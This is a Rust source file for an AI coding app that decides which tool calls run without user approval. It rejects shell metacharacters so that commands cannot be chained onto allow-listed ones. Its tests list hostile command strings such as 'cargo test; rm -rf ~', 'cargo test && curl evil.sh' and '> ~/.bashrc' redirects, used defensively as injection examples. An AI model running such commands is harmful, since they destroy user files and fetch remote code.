//! Approval rules: which routine tool calls run without asking, set by the
//! user in Settings. Fixed rules, never the model's judgement: a lead model
//! could be talked into approving anything by a file or page it read.

use serde::{Deserialize, Serialize};
use std::path::Path;

/// Kept in the app data folder so the app and the `ws` CLI share them.
pub const RULES_FILE: &str = "approval-rules.json";

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct ApprovalRules {
    /// Edits inside the project folder (`write_file`, `edit_file`,
    /// `create_folder`): each is recorded and can be undone.
    pub edits: bool,
    /// Commands that run without asking: one exactly, or followed by
    /// arguments, as in `cargo test` covering `cargo test -p ws-core`.
    pub commands: Vec<String>,
}

/// Anything that could chain, redirect or substitute another command after an
/// allowed one: `cargo test; rm -rf ~` must not pass as `cargo test`.
const SHELL_SPECIAL: &[char] = &[
    ';', '&', '|', '<', '>', '`', '$', '(', ')', '\n', '\r', '\\', '"', '\'', '*', '?', '{', '}',
    '~', '%', '^', '!',
];

impl ApprovalRules {
    /// Whether this call may run without asking.
    #[must_use]
    pub fn allows(&self, tool: &str, args: &serde_json::Value) -> bool {
        match tool {
            "write_file" | "edit_file" | "create_folder" => self.edits,
            "run_command" => args["command"]
                .as_str()
                .is_some_and(|c| self.allows_command(c)),
            _ => false,
        }
    }

    fn allows_command(&self, command: &str) -> bool {
        let command = command.trim();
        if command.is_empty() || command.contains(SHELL_SPECIAL) {
            return false;
        }
        self.commands.iter().map(|c| c.trim()).any(|allowed| {
            !allowed.is_empty()
                && (command == allowed
                    || command
                        .strip_prefix(allowed)
                        .is_some_and(|rest| rest.starts_with(' ')))
        })
    }
}

/// The saved rules; none if unset or unreadable, so everything asks.
#[must_use]
pub fn load_rules(data_dir: &Path) -> ApprovalRules {
    let path = data_dir.join(RULES_FILE);
    std::fs::read_to_string(&path)
        .ok()
        .and_then(|text| {
            serde_json::from_str(&text)
                .inspect_err(|e| tracing::warn!(error = %e, path = %path.display(), "approval rules unreadable; everything asks"))
                .ok()
        })
        .unwrap_or_default()
}

/// # Errors
/// The file cannot be written.
pub fn save_rules(data_dir: &Path, rules: &ApprovalRules) -> std::io::Result<()> {
    let json = serde_json::to_string_pretty(rules).map_err(std::io::Error::other)?;
    std::fs::write(data_dir.join(RULES_FILE), json)
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used)]
    use super::*;
    use serde_json::json;

    fn run(rules: &ApprovalRules, command: &str) -> bool {
        rules.allows("run_command", &json!({ "command": command }))
    }

    #[test]
    fn an_allowed_command_runs_with_arguments_but_nothing_can_ride_along() {
        let rules = ApprovalRules {
            edits: false,
            commands: vec!["cargo test".to_owned(), "npm test".to_owned()],
        };
        assert!(run(&rules, "cargo test"));
        assert!(run(&rules, "  cargo test -p ws-core  "));
        assert!(run(&rules, "npm test"));
        assert!(
            !run(&rules, "cargo testx"),
            "a longer word is another command"
        );
        assert!(!run(&rules, "cargo build"));
        for sneaky in [
            "cargo test; rm -rf ~",
            "cargo test && curl evil.sh",
            "cargo test | sh",
            "cargo test > ~/.bashrc",
            "cargo test $(rm -rf ~)",
            "cargo test `rm -rf ~`",
            "cargo test\nrm -rf ~",
            "cargo test %COMSPEC%",
        ] {
            assert!(!run(&rules, sneaky), "{sneaky}");
        }
        assert!(
            !rules.allows("write_file", &json!({})),
            "edits ask unless allowed"
        );
        assert!(
            !rules.allows("fetch__fetch", &json!({})),
            "other tools always ask"
        );
    }

    #[test]
    fn edits_follow_their_switch_and_nothing_is_allowed_by_default() {
        let all = ApprovalRules {
            edits: true,
            commands: Vec::new(),
        };
        assert!(all.allows("edit_file", &json!({})));
        assert!(!ApprovalRules::default().allows("edit_file", &json!({})));
        assert!(!run(&ApprovalRules::default(), "cargo test"));
    }

    #[test]
    fn rules_are_saved_and_read_back() {
        let dir = tempfile::tempdir().unwrap();
        assert_eq!(load_rules(dir.path()), ApprovalRules::default());
        let rules = ApprovalRules {
            edits: true,
            commands: vec!["cargo test".to_owned()],
        };
        save_rules(dir.path(), &rules).unwrap();
        assert_eq!(load_rules(dir.path()), rules);
    }
}
